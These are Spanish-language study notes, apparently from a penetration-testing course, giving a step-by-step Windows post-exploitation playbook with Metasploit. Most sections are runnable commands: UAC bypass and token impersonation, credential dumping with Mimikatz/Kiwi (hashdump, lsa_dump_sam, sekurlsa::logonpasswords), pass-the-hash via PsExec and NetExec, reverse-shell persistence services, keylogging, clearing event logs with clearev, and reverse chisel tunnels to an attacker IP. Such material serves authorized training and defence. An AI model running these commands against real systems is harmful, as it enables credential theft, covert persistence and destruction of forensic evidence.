-----
# Post-explotación con Metasploit 

Metasploit incluye módulos **post-explotación** para **Windows y Linux** que sirven para **enumerar**, **escalar privilegios**, **extraer credenciales**, **mantener persistencia** y **movimiento lateral**.
## Enumeración típica en Windows 

- **Enumerate user privileges** → ver privilegios del usuario actual (útil para privesc).
- **Enumerate logged on users** → ver usuarios conectados ahora y/o recientemente (pistas de actividad).
- **VM check** → detectar si estás en una máquina virtual (anti-análisis / laboratorio).
- **Enumerate installed programs** → listar software instalado (vectores: apps vulnerables).
- **Enumerate AVs** → identificar antivirus/EDR (adaptar técnica y sigilo).
- **Enumerate computers connected to domain** → descubrir equipos del dominio/red (movimiento lateral).
- **Enumerate installed patches** → ver parches/KB instalados (descartar o buscar CVEs).
- **Enumerate shares** → listar recursos compartidos (posible exfil o credenciales).
## Meterpreter

- **`getuid`** → muestra el usuario con el que corre la sesión (ej. no eres `NT AUTHORITY\SYSTEM`).
- **`help`** → lista comandos disponibles en tu tipo de sesión (y categorías).
- **`screenshot`** → captura la pantalla del usuario (si hay escritorio/sesión interactiva).
- **`hashdump`** → extrae hashes de la SAM (requiere privilegios altos, típicamente SYSTEM).
- **`show_mount`** → lista discos/volúmenes montados y rutas accesibles.
- **`ps`** → lista procesos del sistema con PID/arquitectura/usuario (para migrar o enumerar).
- **`migrate <PID>`** → migra la sesión a otro proceso (mejora estabilidad/permite igualar arquitectura).
- **`background`** → deja la sesión en segundo plano y vuelves a `msfconsole`.
## Módulos Post de Metasploit 

- **`search migrate`** → encuentra módulos para migrar sesión o ayudar a cambiar a proceso compatible (útil si x86/x64).
- **`search win_privs`** → módulos que enumeran privilegios del usuario actual en Windows.
- **`search enum_logged_on_users`** → módulos para enumerar usuario actual y usuarios logueados recientemente.
- **`search windows/checkvm`** → módulos para detectar si el host corre en VM (VMware/VirtualBox, etc.).
- **`search enum_applications`** → módulos para listar aplicaciones instaladas.
- **`loot`** → muestra la información recolectada por módulos (credenciales, configs, resultados).
- **`search type:post platform:windows name:enum_av_excluded`** → busca módulos que enumeran exclusiones del AV (carpetas no escaneadas).
- **`search enum_computers`** → módulos para enumerar otros hosts/equipos visibles en red/dominio.
- **`search enum_patches`** → módulos para listar parches instalados (KB), útil para mapear vulnerabilidades; alternativa en shell: `systeminfo`.
- **`search enum_shares`** → módulos para enumerar recursos compartidos (SMB shares) del host o red.
- **`search enable_rdp`** → módulos relacionados con comprobar/habilitar RDP (ojo: cambia configuración del sistema).

---
# Windows Privilege Escalation:
## Bypassing UAC:

**UAC (User Account Control)** es una característica de seguridad introducida en **Windows Vista** para evitar cambios no autorizados en el sistema, haciendo que ciertas acciones requieran aprobación de un administrador (elevación).
**Idea del bypass:** si tu usuario **ya pertenece al grupo Administrators**, puedes intentar un bypass de UAC para conseguir una **sesión Meterpreter elevada** (high integrity) usando un módulo de escalada.
## Comprobar si tu usuario es admin (desde la sesión)

- **`shell`** → abre una shell del sistema desde Meterpreter (para comandos nativos).
- **`net user <usuario>`** → muestra información del usuario, incluyendo pertenencias (Windows).
- **`net localgroup administrators`** → lista miembros del grupo Administrators local (verifica si estás dentro).
## Bypass UAC con Metasploit 

- **`search bypassuac_injection`** → localiza el módulo de bypass UAC por inyección (crea sesión elevada).
- **`set payload windows/x64/meterpreter/reverse_tcp`** → define payload (elige x64 si el objetivo/proceso es 64-bit).
- **`set SESSION <id>`** → indica la sesión original sobre la que se ejecuta el bypass.
- **`set LPORT <puerto>`** → cambia el puerto local si el default está ocupado.
- **`set LHOST <tu_ip>`** → IP de retorno (tu máquina atacante para la reverse).
- **`set TARGET Windows\ x64`** → fuerza el target/arquitectura si falla por mismatch (x86/x64).
- **`run`** → ejecuta el módulo; si funciona, abre una **nueva sesión** (normalmente más privilegiada).
- **`getsystem`** -> nos sube los privilegios

**Resultado esperado:** te crea **otra sesión**; compruébalo con `sessions -l` y dentro usa `getuid` para confirmar el nivel.

----
## TOKEN IMPERSONATION WITH INCOGNITO:

Un **Access Token** es un **objeto de seguridad temporal** que representa **la identidad y privilegios de un usuario o proceso** en Windows.

👉 Piensa en él como:

- una **credencial viva**
- similar a una **cookie de sesión**, pero a nivel de sistema operativo
### ¿Cuándo se crea un Access Token?

1. Un usuario introduce sus credenciales 
2. `winlogon.exe` valida el login
3. `lsass.exe` crea un **access token**
4. Ese token:
    - contiene **quién eres**
    - **qué privilegios tienes**
    - **a qué grupos perteneces**
5. El token se **asocia (attach)** al proceso inicial del usuario:
    - normalmente `explorer.exe`
    - y a partir de ahí se hereda por los procesos hijos

📌 **Todos los procesos en Windows corren con un access token**  
No hay proceso sin token. Cero. Ninguno.
## ¿QUÉ CONTIENE UN ACCESS TOKEN?

Un token incluye, entre otras cosas:

- Usuario (SID)
- Grupos (Administrators, Users, etc.)
- Privilegios (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.)
- Nivel de integridad
- Tipo de token (primary / impersonation)

👉 Windows **no comprueba el usuario directamente**, comprueba **el token**.

## TIPOS DE ACCESS TOKENS

### 🔹 1. Impersonation-Level Token

- Permite a un proceso **actuar como otro usuario**
- Muy usado en:
    - servicios
    - autenticaciones
    - pipes
- **No puede** iniciar procesos nuevos como ese usuario
- Solo sirve para:
    - acceder a recursos
    - ejecutar acciones puntuales

📌 Es el tipo de token **más común para ataques de impersonation**
### 🔹 2. Delegation-Level Token

- Nivel más alto
- Permite:
    - **impersonar al usuario**
    - **delegar su identidad a otros sistemas**
- Usado en:
    - entornos de dominio
    - autenticación Kerberos
- Mucho menos común
- Mucho más peligroso
## ¿QUÉ ES TOKEN IMPERSONATION?

**Token Impersonation** es la técnica mediante la cual:

- un proceso **roba o reutiliza** un access token válido
- y **actúa como el usuario dueño de ese token**
- **sin conocer su contraseña**

🎯 Objetivo:

- elevar privilegios
- pasar de user → admin → SYSTEM
## PRIVILEGIOS NECESARIOS PARA TOKEN IMPERSONATION

Aquí viene la confusión típica, vamos a aclararla bien 👇
### 🔸 SeImpersonatePrivilege

📌 **EL MÁS IMPORTANTE**

Permite:
- impersonar tokens de otros usuarios
- actuar como ellos temporalmente

👉 Si un proceso tiene este privilegio:

- y existe un token interesante (admin/SYSTEM)
- **es candidato directo a privesc**

🔥 Muchos exploits modernos (PrintSpoofer, JuicyPotato, etc.) dependen de este.

### 🔸 SeAssignPrimaryTokenPrivilege

Permite:
- asignar un **primary token** a un proceso nuevo

👉 Útil cuando:
- quieres lanzar un proceso **como otro usuario**
- no solo impersonarlo

No siempre es necesario para un ataque básico.
### 🔸 SeCreateTokenPrivilege

Permite:
- crear tokens desde cero

📌 Muy raro de ver  
📌 Normalmente solo lo tiene SYSTEM

👉 **No es necesario** en la mayoría de ataques reales.
### ❓ ¿TIENEN QUE ESTAR LOS TRES?

❌ **NO**

En la práctica:

- **SeImpersonatePrivilege** → suele ser suficiente
- Los otros dos son:
    - contextuales
    - casos muy específicos

👉 Si ves `SeImpersonatePrivilege` habilitado → **sonríe** 😏

## ¿DÓNDE SE ABUSAN LOS TOKENS?

- Servicios que:    
    - aceptan conexiones
    - usan impersonation
- Procesos corriendo como:
    - `NT AUTHORITY\SYSTEM`
- Named pipes
- Servicios mal configurados

## INCÓGNITO (METASPLOIT)

### ¿Qué es Incognito?

**Incognito** es un módulo de Meterpreter que permite:

- listar access tokens disponibles
- impersonar tokens sin contraseña
- escalar privilegios si hay tokens interesantes
### Cargar incognito

`getprivs`
`load incognito`
### Listar tokens disponibles

`list_tokens -u`

Ejemplo:

`Delegation Tokens Available: `
`NT AUTHORITY\SYSTEM ` 
`Impersonation Tokens Available: Administrator`

👉 Si ves `SYSTEM` o `Administrator` → **jackpot** 🎰
### Impersonar un token

`impersonate_token "NT AUTHORITY\SYSTEM"`
`getprivs`
`pgrep explorer` -> proceso que pertenece al **usuario logueado**, hay que mudarnos ya que seguimos en el proceso del usuario sin privilegios
`migrate codigo`
`getprivs` -> elevated sesion

## ¿QUÉ PASA SI `list_tokens -u` NO DEVUELVE NADA?

Si al ejecutar en Meterpreter:

`load incognito list_tokens -u`

y **NO aparecen tokens** (ni impersonation ni delegation):

👉 significa que **no hay tokens interesantes disponibles para robar** en ese momento.

Esto suele pasar cuando:

- no hay otros usuarios logueados
- no hay servicios exponiendo tokens reutilizables
- el proceso donde estás **no puede ver tokens ajenos**

📌 Importante:

- **NO significa que no se pueda escalar**
- solo que **token impersonation directa no es posible**
## EN ESE CASO → TÉCNICAS “POTATO”

Aquí entran en juego los **Potato attacks** 🥔😈

## ¿QUÉ SON LOS POTATO ATTACKS?

Los _Potato_ son una familia de exploits que permiten:

- abusar de **SeImpersonatePrivilege**
- forzar a un servicio **SYSTEM** a autenticarse contra nosotros
- capturar ese token
- **impersonar NT AUTHORITY\SYSTEM**

👉 No necesitan que haya tokens visibles previamente.

## REQUISITO CLAVE

Para que un Potato funcione necesitas:

`SeImpersonatePrivilege = ENABLED`

Puedes comprobarlo con:

`getprivs`

Si ves:

`SeImpersonatePrivilege`

🎯 **objetivo desbloqueado**

---
## ¿QUÉ CONSIGUE POTATO?

- Token **NT AUTHORITY\SYSTEM**
- Escalada directa a SYSTEM
- Sin contraseña
- Sin UAC

Resultado final:

`whoami nt authority\system`
## PRINCIPALES VARIANTES DE POTATO

(depende de la versión de Windows)

- **JuicyPotato** → Windows antiguos
- **RoguePotato**
- **PrintSpoofer** → muy fiable en Windows modernos
- **SweetPotato**

📌 Hoy en día:

- **PrintSpoofer** es el más común
- JuicyPotato suele estar parcheado

---
## DUMPING HASHES WITH MIMIKATZ

## ¿QUÉ ES MIMIKATZ?

**Mimikatz** es una herramienta de **post-explotación en Windows** usada para:

- extraer **credenciales en texto claro**
- dumpear **hashes NTLM**
- obtener **tickets Kerberos**
- extraer secretos de autenticación del sistema

Fue creada por **Benjamin Delpy (gentilkiwi)**.

👉 Es una de las herramientas **más importantes y peligrosas** en entornos Windows.

## ¿DE DÓNDE SACA LAS CREDENCIALES?

Mimikatz ataca principalmente el proceso:

`lsass.exe`

**LSASS (Local Security Authority Subsystem Service)**:

- gestiona autenticación    
- guarda en memoria:
    - hashes
    - credenciales
    - tickets Kerberos

📌 Por eso:

- **requiere privilegios elevados**
- normalmente **NT AUTHORITY\SYSTEM**

## FORMAS DE USAR MIMIKATZ

### 1️⃣ Ejecutable clásico (`mimikatz.exe`)

- se sube a la máquina víctima
- se ejecuta desde CMD / PowerShell

### 2️⃣ Módulo Kiwi (Meterpreter)

- versión integrada en Metasploit
- más cómodo
- menos ruido visual

## ESCENARIO DE ATAQUE (CON METERPRETER)

### 1️⃣ Obtener acceso inicial

Ejemplo:

`search badblue_passthru use exploit/windows/http/badblue_passthru`

### 2️⃣ Comprobaciones iniciales

`sysinfo        # arquitectura (x86 / x64) getuid         # usuario actual`

### 3️⃣ Migrar a un proceso estable

`pgrep lsass    # OJO: normalmente NO se migra a LSASS pgrep explorer migrate PID`

📌 Nota importante:

- **NO se recomienda migrar a lsass.exe**
- se migra a `explorer.exe`
- luego se escalan privilegios

### 4️⃣ Escalar a SYSTEM

`getsystem getuid`

Resultado esperado:

`NT AUTHORITY\SYSTEM`

## USO DE MIMIKATZ CON KIWI (METERPRETER)

### 5️⃣ Cargar Kiwi

`load kiwi`

Ver comandos disponibles:

`?`

### 6️⃣ Extraer credenciales

#### 🔹 Todas las credenciales disponibles

`creds_all`

Devuelve:

- hashes NTLM    
- contraseñas en texto claro (si existen)
- tickets Kerberos
#### 🔹 Dumpear la SAM (hashes NTLM)

`lsa_dump_sam`
#### 🔹 Dumpear secretos del sistema

`lsa_dump_secrets`

Puede revelar:

- contraseñas en texto claro
- claves de servicios
- **SYSKEY**
## USO DE MIMIKATZ SIN METERPRETER

### 1️⃣ Preparar directorio

`cd C:\ mkdir Temp cd Temp`

### 2️⃣ Subir mimikatz.exe

`upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`

(usar x86 o x64 según `sysinfo`)

### 3️⃣ Ejecutar Mimikatz

`shell .\mimikatz.exe`

### 4️⃣ Habilitar privilegios de debug

`privilege::debug`

Si devuelve:

`Privilege '20' OK`

✔ Tenemos permisos suficientes.

## COMANDOS IMPORTANTES EN MIMIKATZ

### 🔹 Dumpear hashes NTLM

`lsadump::sam`
### 🔹 Dumpear secretos del sistema

`lsadump::secrets`

Puede mostrar:

- contraseñas de servicios
- credenciales en texto claro
- claves LSA
### 🔹 Credenciales de usuarios logueados

`sekurlsa::logonpasswords`

📌 Este comando:

- intenta mostrar **contraseñas en texto claro**
- solo funciona si:
    - el sistema está mal configurado
    - o no hay protecciones modernas (LSA Protection)

----
## EXPLOITING PASS-THE-HASH WITH PSEXEC

### ¿qué es Pass-the-Hash?

**Pass-the-Hash (PtH)** es una técnica de explotación en la que un atacante **utiliza hashes NTLM robados** para **autenticarse directamente** en servicios Windows **sin necesidad de conocer la contraseña en texto plano**.

En Windows, muchos servicios (SMB, WinRM, PsExec) **aceptan hashes NTLM como método de autenticación**, por lo que si se obtiene el hash, se puede acceder como si se tuviera la contraseña.

👉 No se crackea la contraseña  
👉 Se reutiliza el hash **tal cual**  
👉 Ataque típico de **movimiento lateral**
### ¿en qué situación se usa?

Pass-the-Hash se utiliza cuando:

- ya tenemos acceso a **una máquina Windows**
- hemos obtenido **hashes NTLM** (SAM / LSASS)
- el mismo usuario existe en **otras máquinas**
- queremos **movernos lateralmente** por la red

Muy común en:

- entornos **Active Directory**
- redes Windows mal segmentadas
- usuarios reutilizando credenciales
## herramientas:

- **Metasploit (PsExec module)**  
    👉 Para ejecutar comandos remotamente usando hashes NTLM.
    
- **CrackMapExec (actualmente NetExec / nxc)**  
    👉 Herramienta rápida para **validar hashes y ejecutar comandos**.
## desde Metasploit:

- **obtener acceso inicial (ejemplo vulnerable):**
    `search badblue_passthru set RHOSTS IP run`
    
- **en meterpreter, localizar el proceso LSASS:**
    `pgrep lsass`
    
- **migrar al proceso LSASS:**
    `migrate PID`
    👉 Necesario para volcar credenciales.
    
- **cargar kiwi (mimikatz en MSF):**
    `load kiwi`
    
- **volcar hashes NTLM desde SAM:**
    `lsa_dump_sam`
    👉 Obtiene hashes **LM y NTLM**.
    
- **alternativa rápida:**
    `hashdump`
    👉 Copiar **usuario : RID : LM : NTLM**  
    (LM suele ser inútil, el importante es **NTLM**).
## usar Pass-the-Hash con PsExec (Metasploit):

- **buscar módulo PsExec:**
    `search psexec use exploit/windows/smb/psexec`
    
- **configuración básica:**
    `set RHOSTS IP set SMBUser usuario set SMBPass hash_NTLM set TARGET Native\ upload run`

👉 Obtienes **ejecución remota como SYSTEM** si el usuario tiene privilegios.
## manual (NetExec / CrackMapExec):

- **comprobar si el hash es válido:**
    `nxc smb IP -u usuario -H HASH_NTLM`
    👉 Si aparece `Pwned!` → hash reutilizable.
    
- **ejecutar comandos remotamente:**
    `nxc smb IP -u usuario -H HASH_NTLM -x "whoami"`

- **psexec manual:**
	`impacket-psexec Administrator@192.168.1.10 -hashes :aad3b435b51404eeaad3b435b51404ee`

----
# ESTABLISHING PERSISTENCE ON WINDOWS

La **persistencia** consiste en técnicas que permiten **mantener acceso al sistema** a través de reinicios, cambios de credenciales u otras interrupciones que podrían cortar el acceso inicial.  
No basta con comprometer un sistema una vez: **hay que poder volver a conectarse**.
## Persistencia con Metasploit 

### Flujo básico una vez ganado acceso:

- **`search persistence_service`** → localiza módulos que crean persistencia como servicio de Windows.
- **`set payload windows/meterpreter/reverse_tcp`** → define el payload que se ejecutará de forma persistente.
- **`set LPORT <puerto>`** → puerto local al que se conectará el sistema comprometido.
- **`set SESSION <id>`** → sesión activa sobre la que se instala la persistencia.
- **`run`** → instala el mecanismo de persistencia en el sistema.
## Volver a conectarse al sistema persistido

- **`use multi/handler`** → prepara un listener para recibir conexiones entrantes.
- **`set payload windows/meterpreter/reverse_tcp`** → debe coincidir exactamente con el payload usado en la persistencia.
- **`set LPORT <mismo_puerto>`** → mismo puerto configurado al crear la persistencia.
- **`set LHOST <tu_ip>`** → IP del atacante que recibirá la conexión.
- **`run`** → espera a que el sistema se reinicie o el servicio se ejecute y devuelva la sesión.

---
# ENABLING RDP (Remote Desktop Protocol)

**RDP (Remote Desktop Protocol)** es un protocolo de Microsoft que permite:

- Conectarse **remotamente a un sistema Windows**
- Obtener una **interfaz gráfica completa (GUI)**
- Interactuar con el sistema como si estuviéramos físicamente delante
## Datos clave de RDP

- **Puerto por defecto:** `3389/TCP`
- El puerto **puede cambiarse** → siempre hay que enumerar
- Requiere **usuario y contraseña válidos**
- En muchos sistemas está **deshabilitado por defecto**

📌 Se suele habilitar para **persistencia** y **acceso gráfico**, no como primer vector de ataque.
## Habilitar RDP con Metasploit

Una vez obtenida una sesión:

- **`search enable_rdp`** → localiza el módulo que habilita RDP en el sistema.
- **`set SESSION <id>`** → sesión sobre la que se aplicará el cambio.
- **`run`** → habilita RDP (y normalmente ajusta el firewall si es necesario).
## Cambio de contraseña (ejemplo — poco sigiloso)

- **`net user administrator pwned`** → cambia la contraseña del usuario `administrator` a `pwned`.

⚠️ **Muy ruidoso**: salta en logs y es fácilmente detectable. No recomendable en escenarios reales.
## Conexión por RDP desde Linux

- **`xfreerdp /u:administrator /p:pwned /v:<ip>`** → conecta por RDP usando las credenciales indicadas al host objetivo.

📌 Si RDP está activo y las credenciales son válidas, obtendrás **acceso gráfico completo** al sistema.

---
# WINDOWS KEYLOGGING

El **keylogging** es el proceso de **capturar las pulsaciones del teclado** de un sistema objetivo.  
No es exclusivo de la post-explotación: existen **programas** y **dispositivos USB hardware** capaces de registrar y transmitir pulsaciones.  
En **Windows**, **Meterpreter** permite capturar estas pulsaciones y **descargarlas al sistema del atacante**.

**¿Para qué se usa?**
- **Recopilación de credenciales** (usuarios y contraseñas).
- **Recopilación de información sensible** escrita por el usuario.
- **Acceso sigiloso**, evitando conexiones visibles (p. ej., RDP) que puedan levantar sospechas.
## Keylogging con Meterpreter

- **`help`** → muestra los comandos disponibles en la sesión Meterpreter (incluye keylogging si está soportado).
- **`keyscan_start`** → inicia la captura de pulsaciones del teclado en el sistema comprometido.
- **`keyscan_stop`** → detiene la captura de pulsaciones del teclado.
- **`keyscan_dump`** → muestra y descarga las pulsaciones capturadas hasta el momento.

📌 Requiere que el usuario objetivo esté **activo** (sesión interactiva); si no hay actividad, no habrá pulsaciones.

---
# CLEARING WINDOWS EVENT LOGS

El sistema operativo **Windows** registra y cataloga **todas las acciones y eventos** del sistema en los **Windows Event Logs**.

## Tipos de event logs:

- **Application logs** → eventos generados por aplicaciones y programas.
- **System logs** → eventos del sistema operativo y servicios.
- **Security logs** → eventos de seguridad (inicios de sesión, privilegios, auditoría).

Estos logs pueden consultarse mediante el **Event Viewer** de Windows.

📌 Los **event logs** son el **primer punto de análisis forense** tras detectar una intrusión, por lo que **limpiar rastros** es crítico al finalizar una evaluación (siempre en contexto de laboratorio o auditoría autorizada).
## Borrado de logs desde Meterpreter — 1 línea, 1 explicación

- **`clearev`** → borra los logs de **Application**, **System** y **Security** del sistema Windows comprometido.

⚠️ **Nota importante**: `clearev` es **muy ruidoso** y fácilmente detectable (la ausencia repentina de logs también es un indicador forense).

---
# PIVOTING

El **pivoting** es una técnica de **post-explotación** que consiste en **usar un host comprometido como punto intermedio**para atacar otros sistemas dentro de su **red interna privada**.
Tras comprometer un primer host (pivot), podemos **alcanzar sistemas que no eran accesibles directamente** desde nuestra máquina atacante.

**Meterpreter** permite:
- Añadir **rutas** hacia subredes internas.
- Escanear y explotar otros hosts a través del sistema comprometido.
- Realizar **port forwarding**.
- Servir como túnel para herramientas externas (ej. **chisel**).
## Pivoting con Meterpreter (AutoRoute)

### Desde la sesión Meterpreter:

- **`run autoroute -s <red>/<subred>`** → añade una ruta a la red interna accesible desde el host comprometido.
- **`background`** → envía la sesión a segundo plano para usar módulos auxiliares.
## Escaneo interno usando Metasploit

- **`search auxiliary/scanner/portscan/tcp`** → localiza el escáner TCP de Metasploit.
- **`use auxiliary/scanner/portscan/tcp`** → carga el módulo de escaneo.
- **`set RHOSTS <ip_target2>`** → define el host interno objetivo.
- **`set PORTS 1-100`** → define el rango de puertos a escanear.
- **`exploit`** → ejecuta el escaneo a través del pivot.

📌 El tráfico pasa por el host comprometido gracias a `autoroute`.
## Pivoting mediante Port Forwarding (Meterpreter)

### Desde la sesión Meterpreter:

- **`portfwd add -l 1234 -p 80 -r <ip_target2>`** → redirige el puerto local 1234 al puerto 80 del host interno objetivo.
- **`background`** → vuelve a `msfconsole`.
### Desde Metasploit:

- **`db_nmap -sS -sV -p 1234 localhost`** → escanea el puerto redirigido como si el servicio estuviera en tu máquina local.

📌 Esto permite usar **herramientas locales** contra servicios internos.
## Explotación de un host interno (ejemplo)

- **`search badblue`** → busca exploits para el servicio BadBlue.
- **`use exploit/windows/http/badblue_passthru`** → carga el exploit correspondiente.
- **`set payload windows/meterpreter/bind_tcp`** → define un payload bind para red interna.
- **`set LPORT 4433`** → puerto en el que escuchará el payload.
- **`set RHOST <ip_target2>`** → host interno objetivo.
- **`exploit`** → lanza el exploit a través del pivot.
# Pivoting con CHISEL

**Chisel** es una herramienta de **tunneling TCP sobre HTTP/HTTPS**, muy usada para pivoting cuando Metasploit no es suficiente o no está disponible.
## Escenario típico

- Tu máquina atacante **NO** puede acceder a la red interna.
- El host comprometido **SÍ** tiene acceso.
- Usamos chisel para crear un **túnel**.
## Paso 1: Servidor Chisel (máquina atacante)

- **`chisel server --reverse -p 8000`** → inicia el servidor chisel en modo reverse en el puerto 8000.
## Paso 2: Cliente Chisel (host comprometido)

- **`chisel client <IP_ATACANTE>:8000 R:1080:socks`** → crea un túnel SOCKS inverso hacia el atacante.

📌 El host comprometido se conecta hacia fuera (útil si hay firewall restrictivo).
## Paso 3: Uso del túnel SOCKS

- **`proxychains nmap -sT -Pn <ip_target2>`** → escanea hosts internos usando el túnel SOCKS.
- **`proxychains firefox`** → navega por servicios web internos.
- **`proxychains crackmapexec smb <subred>`** → enumera SMB en la red interna.

📌 SOCKS permite usar **cualquier herramienta externa** como si estuvieras dentro de la red.